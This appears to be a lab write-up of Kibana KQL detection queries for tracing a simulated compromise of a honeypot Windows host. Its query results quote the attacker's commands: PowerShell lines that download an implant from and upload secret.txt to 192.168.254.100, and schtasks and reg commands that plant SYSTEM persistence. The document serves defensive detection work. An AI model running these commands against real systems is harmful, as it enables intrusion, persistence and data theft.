# Detection Queries (KQL) — all bar-verified

Every query below was **run against the live SIEM during the lab** and returned the exact
events described. These are for the **Kibana KQL search bar** (Discover / Security → Alerts),
not the EQL in `correlation.md`.

> **Cluster-specific gotchas learned the hard way** (why some "obvious" queries return 0):
> - Use `destination.port` / `destination.ip` — **NOT** `network.destination.port` (0 hits)
> - `process.command_line: "*…*"` wildcards **fail in the KQL bar** (tokenization) → use `process.name`, `message`, or the Dev-Tools DSL
> - `registry.key: "*…*"` fails → use `registry.value` or `registry.data.strings`
> - Short field names + exact values win in the bar.

Host filter used throughout: `host.name: "honeypot"` (your honeypot name).

---

## 1. The beacon — C2 callback (the "phone call")

```
host.name: "honeypot" AND destination.port: 4443
```
**Returns** every egress TCP connection the beacon made to `192.168.254.100:4443`:
`connection_attempted` → `disconnect_received`, all from `office_update.exe`.

### The 6 columns that prove a network event IS the beacon
Open any hit and check these (order = how much each proves):

| Column | Value | Why it's a red flag |
|---|---|---|
| `destination.port` | `4443` | Metasploit's default C2 port — legit apps don't call this |
| `destination.ip` | `192.168.254.100` | Fixed internal IP = our attacker box |
| `process.name` | `office_update.exe` | No legit program has this name |
| `process.executable` | `C:\Users\honey\Downloads\office_update.exe` | **Runs from a user Downloads folder, not System32** — the smoking gun |
| `process.code_signature.exists` | `false` | **Unsigned.** Real Office is always signed |
| `network.direction` | `egress` | **Outbound** — the victim dialed out (reverse TCP) |

Supporting: `network.transport: tcp`, `event.action: connection_attempted → disconnect_received`.

---

## 2. The beacon process (executions)

```
host.name: "honeypot" AND process.name: "office_update.exe"
```
Process starts, Security `created-process` events, and the Elastic Defend alerts across the run.

### The execution alert (highest fidelity)
The **critical** memory-signature alert — Elastic's YARA engine matched `shellcode_thread`
in the process's memory the moment the beacon decoded:

- **rule:** Elastic Defend memory signature (Stealth)
- **detection:** `shellcode_thread` · **severity critical** · **risk 99**
- **MITRE tags:** T1055 Process Injection, T1620 Reflective Code Loading
- **_id:** `cb9f8d7b1d4d9fdb3582d010de6fbc69fb73d87b5def80b096335101570bcf3f`

Find it in **Security → Alerts** with:
```
host.name: "honeypot" AND process.name: "office_update.exe"
```

---

## 3. Persistence — scheduled task + Run key

### Task-cache + Run-key writes (cleanest "it was planted" signal)
```
host.name: "honeypot" AND ( registry.value: "WinUpdateSvc" OR registry.data.strings: *WinUpdateSvc* )
```
**Returns 2 hits** — the Task Scheduler `TaskCache` write (`Path = \WinUpdateSvc` + URI/Date/
Author/Triggers/Actions) and the `HKLM\…\CurrentVersion\Run :: WinUpdateSvc = C:\ProgramData\WinUpdate\wu_service.exe` write.

### The schtasks / reg processes (with the full command line)
```
host.name: "honeypot" AND ( process.name: "schtasks.exe" OR process.name: "reg.exe" )
```
Open a hit → `process.command_line` shows the full command:
```
schtasks /create /tn "WinUpdateSvc" /tr "C:\ProgramData\WinUpdate\wu_service.exe" /sc onstart /ru SYSTEM /f
reg    add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdateSvc" /t REG_SZ /d "C:\ProgramData\WinUpdate\wu_service.exe" /f
```

### Persistence window (time-bounded, no noise)
```
host.name: "honeypot" AND ( process.name: "schtasks.exe" OR process.name: "reg.exe" OR registry.value: "WinUpdateSvc" OR registry.data.strings: *WinUpdateSvc* ) AND @timestamp >= "2026-10-12T05:26:00Z" AND @timestamp <= "2026-10-12T05:31:00Z"
```

---

## 4. Ingress — the implant downloaded & staged

```
host.name: "honeypot" AND powershell.file.script_block_text: "DownloadFile"
```
**Returns** the PS 4104 scriptblock:
```
(New-Object Net.WebClient).DownloadFile('http://192.168.254.100:8080/office_update.exe','C:\ProgramData\WinUpdate\wu_service.exe')
```

---

## 5. Exfiltration — the file goes out

```
host.name: "honeypot" AND powershell.file.script_block_text: "UploadFile"
```
**Returns exactly 1 hit** — the theft (Event ID 4104, user = SYSTEM):
```
(New-Object Net.WebClient).UploadFile('http://192.168.254.100:4444','C:\Users\honey\OneDrive\Documents\secret.txt')
```
One line = the whole story: file path on the left (what was stolen), `:4444` on the right (where it went).

The matching process-creation layer:
```
host.name: "honeypot" AND message: "UploadFile" AND message: "secret.txt"
```

---

## 6. The whole attacker-IP footprint

```
host.name: "honeypot" AND destination.ip: "192.168.254.100"
```
`msedge.exe` (the download), `office_update.exe` (C2), and `powershell.exe` (exfil) — one query,
every connection to the attacker box.

---

## 7. Beacon: start → call pairs (for the slide)

```
host.name: "honeypot" AND ( destination.port: 4443 OR (process.name: "office_update.exe" AND event.action: "start") )
```
Each beacon **starting** + each beacon **dialing 4443** — visually proves *run = immediately phone home*.

---

### Notes
- `event.action: "start"` in the KQL bar can be finicky; if a clause 0s out, drop it and rely on the `process.name` / `destination.*` terms.
- For the **full command line** when the KQL bar can't wildcard it, use Dev Tools (DSL) — see `correlation.md`.
- Timestamps in the SIEM are **UTC**; the lab ran 13:00–15:48 MYT (UTC+8) = 05:00–07:48 UTC.
